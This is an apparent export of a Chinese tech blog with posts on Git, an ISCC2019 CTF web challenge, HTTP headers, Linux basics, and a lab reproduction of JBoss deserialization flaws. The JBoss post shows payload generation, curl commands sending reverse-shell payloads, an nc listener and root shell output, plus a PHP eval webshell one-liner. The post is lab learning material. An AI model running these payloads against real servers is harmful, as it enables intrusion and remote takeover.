<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br><span class="line"></span><br><span class="line">Untracked files:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)</span><br><span class="line"></span><br><span class="line">        LICENSE</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
<p>Git告诉我们，<code>README.txt</code>被修改了，而<code>LICENSE</code>还从来没有被添加过，所以它的状态是<code>Untracked</code>。</p>
<p>使用两次命令<code>git add</code>，把<code>README.txt</code>和<code>LICENSE</code>都添加后，用<code>git status</code>再查看一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">        new file:   LICENSE</span><br><span class="line">        modified:   README.txt</span><br></pre></td></tr></table></figure>
<p>now,暂存区的状态就变成了这样：<br><img src="https://i.imgur.com/uzfw7MQ.jpg" alt></p>
<p>所以，<code>git add</code>命令实际上就是把要提交的所有修改放到暂存区（Stage），然后，执行<code>git commit</code>就可以一次性把暂存区的所有修改提交到分支。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;modify README.txt &amp; add LICENSE&quot;</span><br><span class="line">[master 081378e] modify README.txt &amp; add LICENSE</span><br><span class="line"> 2 files changed, 3 insertions(+), 2 deletions(-)</span><br><span class="line"> create mode 100644 LICENSE</span><br></pre></td></tr></table></figure>
<p>提交后，如果你又没有对工作区做任何修改，那么工作区就是“空”的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/lUcN5yh.jpg" alt></p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><ul>
<li><code>git status</code>查看当前工作区的状态</li>
<li><code>git diff</code>对比发现文件修改前后的修改了哪些内容</li>
<li><code>HEAD</code>指向当前版本，Git可以在历史版本之间来回穿梭，使用<code>git reset --hard commit_id</code></li>
<li><code>git log</code>可以查看提交的历史，找到commit_id</li>
<li><code>git reflog</code>可以查看历史命令，可以回到未来的版本</li>
<li>工作区指仓库的本地目录</li>
</ul>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC2019-Web</title>
    <url>/posts/25084.html</url>
    <content><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#39;flag.php&#39;;</span><br><span class="line">$value &#x3D; $_GET[&#39;value&#39;];</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$username &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">    else $username .&#x3D; chr($value[$i]);</span><br><span class="line">    if ($username &#x3D;&#x3D; &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123;</span><br><span class="line">        echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL;</span><br><span class="line">        echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要传入两个变量<code>value</code>和<code>password</code>.</p>
<p>count():返回数组中元素的数目<br>unset():销毁指定的变量<br>chr():返回相对应于 ascii 所指定的单个字符<br>.= : 拼接字符串<br>intval():通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>$username == &#39;w3lc0me_To_ISCC2019&#39;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP消息头</title>
    <url>/posts/35270.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>HTTP消息头是指，在超文本传输协议（ Hypertext Transfer Protocol ，HTTP）的请求和响应消息中，协议头部分的那些组件。HTTP消息头用来准确描述正在获取的资源、服务器或者客户端的行为，定义了HTTP事务中的具体操作参数。</p>
<h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><p>HTTP请求报文由3部分组成：<code>请求行</code>+<code>请求头</code>+<code>请求体</code><br><img src="/posts/35270/HP1.jpg" alt="HTTP请求报文"><br>①是请求方法，GET和POST是最常见的HTTP方法，除此以外还包括DELETE、HEAD、OPTIONS、PUT、TRACE。</p>
<p>②是请求对于的URL地址，它和报文头的HOST属性组成完整的请求URL。</p>
<p>③是协议名称和版本号。</p>
<p>④是HTTP的报文头，报文头包含若干个属性，格式为“属性名：属性值”，服务端据此获取客户端的信息。</p>
<p>⑤是报文体，它将一个页面表单中的组件值通过param1=value&amp;param2=value2的键值对形式编码成一个格式化串，它承载多个请求参数的数据。不但报文体可以传递请求参数，请求URL也可以通过类似于“/chapter15/user.html? param1=value1&amp;param2=value2”的方式传递请求参数。</p>
<p><strong>请求报文头属性</strong></p>
<ul>
<li><p><strong>Accept</strong><br>请求报文可通过一个“Accept”报文头属性告诉服务端 客户端接受什么类型的响应。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept:text&#x2F;plain</span><br></pre></td></tr></table></figure></li>
<li><p><strong>Cookie</strong> </p>
</li>
<li><p><strong>Referer</strong></p>
</li>
<li><p><strong>Cache-Control</strong></p>
</li>
<li><p><strong>Content-Type</strong><br>关于字符的编码，1.0版规定，头信息必须是 ASCII 码，后面的数据可以是任何格式。因此，服务器回应的时候，必须告诉客户端，数据是什么格式，这就是Content-Type字段的作用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br><span class="line">这些数据类型总称为MIME type，每个值包括一级类型和二级类型，之间用斜杠分隔。</span><br></pre></td></tr></table></figure>
<p><code>MIME type</code>还可以在尾部使用分号，添加参数。</p>
<p><code>Content-Type: text/html; charset=utf-8</code><br>上面的类型表明，发送的是网页，而且编码是UTF-8。</p>
</li>
<li><p><strong>Content-Encoding</strong><br>由于发送的数据可以是任何格式，因此可以把数据压缩后再发送。Content-Encoding字段说明数据的压缩方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* **Content-Length**</span><br><span class="line">  一个TCP连接现在可以传送多个回应，势必就要有一种机制，区分数据包是属于哪一个回应的。这就是Content-length字段的作用，声明本次回应的数据长度。</span><br><span class="line"></span><br><span class="line"> &#96;Content-Length: 3495&#96;</span><br><span class="line"> 上面代码告诉浏览器，本次回应的长度是3495个字节，后面的字节就属于下一个回应了。</span><br><span class="line"></span><br><span class="line"># 响应头</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>JBOSS漏洞复现</title>
    <url>/posts/9957.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><h2 id="0x01-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504"><a href="#0x01-JBossMQ-JMS-反序列化漏洞-CVE-2017-7504" class="headerlink" title="0x01 JBossMQ JMS 反序列化漏洞(CVE-2017-7504)"></a>0x01 JBossMQ JMS 反序列化漏洞(CVE-2017-7504)</h2><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>目标： <code>http://192.168.220.151:8080</code></p>
<p>利用工具： <a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">JavaDeserH2HC</a></p>
<p>poc使用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击机下载执行执行生成二进制payload文件：</span><br><span class="line"> </span><br><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">  </span><br><span class="line"> #修改接收shell的主机ip和端口</span><br><span class="line"> </span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8080 (IP:端口)</span><br><span class="line"> </span><br><span class="line">curl向被攻击服务器发送攻击payload：</span><br><span class="line">curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>

<p>我们选择一个Gadget： <code>ExampleCommonsCollections1WithHashMap</code></p>
<p>编译并生成序列化数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java</span><br><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br><span class="line">Saving serialized object in ExampleCommonsCollections1WithHashMap.ser</span><br></pre></td></tr></table></figure>
<p>我们执行的命令是<code>touch /tmp/success</code>，执行完成后，将生成一个文件<code>ExampleCommonsCollections1WithHashMap.ser</code>，将该文件作为body发送如下数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser</span><br></pre></td></tr></table></figure>
<p>这个过程会产生一些警告，但好像不影响使用</p>
<p>执行 <code>docker exec -ti 容器ID /bin/bash</code> 进入容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@0ec136da132e:&#x2F;opt&#x2F;jdk# cd &#x2F;tmp</span><br><span class="line">root@0ec136da132e:&#x2F;tmp# ls</span><br><span class="line">hsperfdata_root  success</span><br></pre></td></tr></table></figure>
<p>可以利用重定向写入一句话木马:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&lt;?php @eval(_POST[&#39;test&#39;]); ?&gt; &gt; &#x2F;tmp&#x2F;test.php</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@0ec136da132e:&#x2F;tmp# ls</span><br><span class="line">aa.php	hsperfdata_root  success</span><br><span class="line">root@0ec136da132e:&#x2F;tmp# cat aa.php </span><br><span class="line">&lt;?php @eval(_POST[test]); ?&gt;</span><br><span class="line">root@0ec136da132e:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a></li>
</ol>
<h2 id="0x02-JBoss-5-x-6-x-反序列化漏洞-CVE-2017-12149"><a href="#0x02-JBoss-5-x-6-x-反序列化漏洞-CVE-2017-12149" class="headerlink" title="0x02 JBoss 5.x/6.x 反序列化漏洞(CVE-2017-12149)"></a>0x02 JBoss 5.x/6.x 反序列化漏洞(CVE-2017-12149)</h2><h3 id="漏洞说明-1"><a href="#漏洞说明-1" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker up -d</span><br></pre></td></tr></table></figure>
<p>初始化完成后访问<code>http://192.168.220.151:8080/</code>即可看到JBoss默认页面<br>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化</p>
<p>下载poc： <a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
<p>使用poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java </span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8888</span><br><span class="line">Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
<p>在攻击机上开启端口监听：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br></pre></td></tr></table></figure>
<p>向目标发送payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;JBoss Web&#x2F;3.0.0-CR2 - Error report&lt;&#x2F;title&gt;&lt;style&gt;&lt;!--H1 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;&#125; H2 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;&#125; H3 &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;&#125; BODY &#123;font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;&#125; B &#123;font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;&#125; P &#123;font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;&#125;A &#123;color : black;&#125;A.name &#123;color : black;&#125;HR &#123;color : #525D76;&#125;--&gt;&lt;&#x2F;style&gt; &lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 500 - &lt;&#x2F;h1&gt;&lt;HR size&#x3D;&quot;1&quot; noshade&#x3D;&quot;noshade&quot;&gt;&lt;p&gt;&lt;b&gt;type&lt;&#x2F;b&gt; Exception report&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;message&lt;&#x2F;b&gt; &lt;u&gt;&lt;&#x2F;u&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;description&lt;&#x2F;b&gt; &lt;u&gt;The server encountered an internal error () that prevented it from fulfilling this request.&lt;&#x2F;u&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;exception&lt;&#x2F;b&gt; &lt;pre&gt;java.lang.ClassCastException: java.util.HashSet cannot be cast to org.jboss.invocation.MarshalledInvocation</span><br><span class="line">	org.jboss.invocation.http.servlet.ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:106)</span><br><span class="line">&lt;&#x2F;pre&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;b&gt;note&lt;&#x2F;b&gt; &lt;u&gt;The full stack trace of the root cause is available in the JBoss Web&#x2F;3.0.0-CR2 logs.&lt;&#x2F;u&gt;&lt;&#x2F;p&gt;&lt;HR size&#x3D;&quot;1&quot; noshade&#x3D;&quot;noshade&quot;&gt;&lt;h3&gt;JBoss Web&#x2F;3.0.0-CR2&lt;&#x2F;h3&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC#</span><br></pre></td></tr></table></figure>
<p>反弹shell成功！！！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">192.168.220.151: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.220.133] from (UNKNOWN) [192.168.220.151] 53530</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li>
<li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li>
</ul>
<h2 id="0x03-JMXInvokerServlet-反序列化漏洞"><a href="#0x03-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="0x03 JMXInvokerServlet 反序列化漏洞"></a>0x03 JMXInvokerServlet 反序列化漏洞</h2><h3 id="漏洞说明-2"><a href="#漏洞说明-2" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>这个漏洞与前两个差别不大，JBoss在处理<code>/invoker/JMXInvokerServlet</code>请求的时候读取了对象。</p>
<p>所以，只要把url改成下面即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;JMXInvokerServlet</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java </span><br><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.220.133:8888</span><br><span class="line">Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>
<p>在攻击机上开启端口监听：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br></pre></td></tr></table></figure>
<p>向目标发送payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;JavaDeserH2HC# curl http:&#x2F;&#x2F;192.168.220.151:8080&#x2F;invoker&#x2F;JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser </span><br><span class="line">Warning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tell </span><br><span class="line">Warning: curl to output it to your terminal anyway, or consider &quot;--output </span><br><span class="line">Warning: &lt;FILE&gt;&quot; to save to a file.</span><br></pre></td></tr></table></figure>
<p>有几个警告，不影响操作。</p>
<p>反弹shell成功。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -lvvp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">192.168.220.151: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.220.133] from (UNKNOWN) [192.168.220.151] 41174</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux入门学习</title>
    <url>/posts/18536.html</url>
    <content><![CDATA[<h2 id="指令与选项"><a href="#指令与选项" class="headerlink" title="指令与选项"></a>指令与选项</h2><p>什么是Linux的指令？<br>指在Linux终端（命令行）中输入的内容就称之为指令 </p>
<a id="more"></a> 
<p><img src="https://i.imgur.com/fM5coUs.png" alt><br>一个完整的指令的标准格式：Linux通用的格式</p>
<p><strong>指令主体（空格） [选项]（空格） [操作对象]</strong></p>
<p>一个指令可以包含多个选项操作对象也可以是多个。</p>
<p>例如：需要让张三同学帮忙去楼下小卖铺买一瓶农夫山泉水和清风餐巾纸，在这个指令中“买东西”是指令的主体，买的水和餐巾纸是操作的对象，农夫山泉、清风是操作的选项。</p>
<h2 id="基础指令（重点）"><a href="#基础指令（重点）" class="headerlink" title="基础指令（重点）"></a>基础指令（重点）</h2><p><strong>1、ls指令</strong><br>含义：ls （list）<br><strong>用法1</strong>：<br><code>#ls</code><br>含义：列出当前工作目录下的所有文件/文件夹的名称<br><img src="https://i.imgur.com/MNMiZm6.png" alt><br><strong>用法2</strong>：<br><code>#ls 路径</code><br>含义：列出指定路径下的所有文件/文件夹的名称<br><strong>关于路径</strong>（重要）：<br>路径可以分为两种：相对路径、绝对路径。<br>相对路径：相对首先得有一个参照物（一般就是当前的工作路径）；<br>相对路径的写法：在相对路径中通常会用到2个符号“./”【表示当前目录下】、“../”【上一级目录下】。<br>绝对路径：绝对路径不需要参照物，直接从根“/”开始寻找对应路径；<br><img src="https://i.imgur.com/cVXsgTA.png" alt><br>用法3：#ls 选项 路径<br>含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。<br>常见的语法：<br>    #ls -l 路径<br>    #ls -la 路径<br>选项解释：<br>    -l：表示list，表示以详细列表的形式进行展示<br>    -a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）<br><img src="https://i.imgur.com/nFBEltY.png" alt><br>上述列表中的第一列字符表示文档的类型，其中“-”表示改行对应的文档类型为文件，“d”表示文档类型为文件夹。<br><img src="https://i.imgur.com/IZH0Y2T.png" alt><br>在Linux中隐藏文档一般都是以“.”开头。<br><strong>用法4</strong>：#ls -lh 路径<br>含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以可读性较高的形式显示<br>参数含义：<br><img src="https://i.imgur.com/U0HadBJ.png" alt><br><strong>2、pwd指令</strong><br>用法：#pwd （print working directory，打印当前工作目录）<br><img src="https://i.imgur.com/WJD7plQ.png" alt><br><strong>3、cd指令</strong><br>命令：#cd        （change directory，改变目录）<br>作用：用于切换当前的工作目录的<br>语法：#cd 路径</p>
<p>案例：当前在“/”下，需要使用绝对路径切换到/usr/local。<br><img src="https://i.imgur.com/d9G4f1z.png" alt></p>
<p>案例：当前在/usr/local下，需要使用相对路径切换目录到home目录下的Linux123用户家目录中去。<br><img src="https://i.imgur.com/9037q6Y.png" alt><br>补充：<br>在Linux中有一个特殊的符号“~”，表示当前用户的家目录。<br>切换的方式：#cd ~<br><img src="https://i.imgur.com/hUPzXml.png" alt><br><strong>4、mkdir指令</strong><br>指令：mkdir    （make directory，创建目录）<br>语法1：#mkdir 路径 【路径，可以是文件夹名称也可以是包含名称的一个完整路径】</p>
<p>案例：在当前路径下创建出目录“yunweihenniux”<br><img src="https://i.imgur.com/0SemL16.png" alt><br>注意：ls列出的结果颜色说明，其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限。 </p>
<p>案例：在指定路径下创建出一个文件夹“yunweihenniux”<br><img src="https://i.imgur.com/tdL2awL.png" alt>   </p>
<p>语法2：#mkdir -p 路径<br>含义：当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错<br><img src="https://i.imgur.com/fzvNnfY.png" alt> </p>
<p>语法3：#mkdir 路径1 路径2 路径3 ….  【表示一次性创建多个目录】<br><img src="https://i.imgur.com/12MjF4A.png" alt>   </p>
<p><strong>5、touch指令</strong><br>令：touch<br>作用：创建文件<br>语法：#touch 文件路径    【路径可以是直接的文件名也可以是路径】 </p>
<p>案例：使用touch来在当前路径下创建一个文件，命名为Linux.txt<br><img src="https://i.imgur.com/2cVdBLZ.png" alt><br>案例：使用touch来同时创建多个文件<br> <img src="https://i.imgur.com/udw4JAh.png" alt><br>案例：使用touch来在“Linux123”用户的家目录中创建文件，Linux.txt<br><img src="https://i.imgur.com/EA9vj21.png" alt>   </p>
<p><strong>6、cp指令</strong><br>指令：cp        （copy，复制）<br>作用：复制文件/文件夹到指定的位置<br>语法：#cp 被复制的文档路径 文档被复制到的路径</p>
<p>案例：使用cp命令来复制一个文件<br><img src="https://i.imgur.com/v0Lvl89.png" alt><br>注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。</p>
<p>案例：使用cp命令来复制一个文件夹<br>注意：当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”【-r表示递归复制】，否则目录将被忽略<br><img src="https://i.imgur.com/dA2SgW8.png" alt>   </p>
<p><strong>7、mv指令</strong><br>指令：mv   （move，移动，剪切）<br>作用：移动文档到新的位置<br>语法：#mv 需要移动的文档路径 需要保存的位置路径</p>
<p>确认：移动之后原始的文件还在不在原来的位置？原始文件是不在原始位置的</p>
<p>案例：使用mv命令移动一个文件<br><img src="https://i.imgur.com/IXuhMPg.png" alt><br>案例：使用mv命令移动一个文件夹<br><img src="https://i.imgur.com/klYJwNI.png" alt><br>补充：在Linux中重命名的命令也是mv，语法和移动语法一样。<br><img src="https://i.imgur.com/1Uwg8yZ.png" alt>   </p>
<p><strong>8、rm指令</strong><br>指令：rm （remove，移除、删除）<br>作用：移除/删除文档<br>语法：#rm 选项 需要移除的文档路径<br>选项：<br>    -f：force，强制删除，不提示是否删除<br>    -r：表示递归</p>
<p>案例：删除一个文件<br><img src="https://i.imgur.com/gyOCm41.png" alt>   </p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux基础命令</title>
    <url>/posts/60189.html</url>
    <content><![CDATA[<p>文件操作命令：</p>
<p>根目录：/</p>
<p>家目录：/home</p>
<p>临时目录：/tmp</p>
<a id="more"></a>

<p>配置目录：/etc</p>
<p>用户程序目录：/user</p>
<p>查看目录：ls</p>
<p>到指定目录：cd</p>
<p>新建文件：touch 文件名</p>
<p>新建文件夹：mkdir 文件夹名</p>
<p>复制：cp 文件1 文件2</p>
<p>移动：mv</p>
<p>显示路径：pwd</p>
<p>删除文件：rm</p>
<p>删除文件夹：rmdir 文件夹</p>
<p>　　　　　　rm -r 文件夹    //删除整个文件夹及其内部文件</p>
<p>　　　　　　rm -rf 文件夹   //强制删除</p>
<p>用vim新建一个文件：</p>
<p>　　vim a</p>
<p>　　按 i 进入insert模式，进行编辑</p>
<p>　　编辑完按ESC推出insert模式，按 ： 再按 wq 保存推出，q 不保存直接退出</p>
<p>　　移动到行首和行位：打开大写，输入G跑到行位，恢复到小写，按两次gg跑到行首</p>
<p>　　删除一行：小写dd，按 u 恢复</p>
<p>没有鼠标复制：光标在某一行时，按yy，再到指定位置按 p 即可</p>
<p>：set number 显示行数模式，最后可用cat查看</p>
<p>文件的权限：777最大权限</p>
<p>r 是读，w 是写，x 是可执行</p>
<p>r = 4，w = 2，x = 1</p>
<p>文件搜索，查找，读取：</p>
<p>　　从文件尾部读取：tail（一般加上 -f ，实时追踪）</p>
<p>　　从文件头部读取：head （按住enter键，一行一行往下）</p>
<p>　　读取整个文件：cat</p>
<p>　　分页读取：more</p>
<p>　　可控分页：less</p>
<p>搜索关键字：grep</p>
<p>查看当前系统时间：data</p>
<p>关机：shutdown -h now  //立刻关机</p>
<p>　　   shutdown -h +10   //10分钟后关机</p>
<p>　　   shutdown -h 12:00:00   //12点关机</p>
<pre><code>halt     //立刻关机</code></pre><p>重启：shutdown -r now    </p>
